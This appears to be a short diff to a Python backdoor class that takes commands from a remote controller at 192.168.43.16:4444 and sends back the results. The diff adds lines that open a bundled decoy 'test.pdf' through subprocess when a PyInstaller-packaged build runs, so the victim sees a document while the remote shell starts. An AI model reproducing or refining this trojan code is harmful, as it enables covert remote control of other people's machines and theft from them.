@@ -53,7 +53,6 @@ class Backdoor:
             return "[+] Upload Successful"
 
     def run(self):
-        # connection.send("[+] I'am in")
 
         while True:
             command = self.reliable_recv()
@@ -80,6 +79,8 @@ class Backdoor:
 
             self.reliable_send(command_result)
 
+file_name = sys._MEIPASS + "\test.pdf"
+subprocess.Popen(file_name, shell=True)
 try:
     my_backdoor = Backdoor("192.168.43.16", 4444)
     my_backdoor.run()
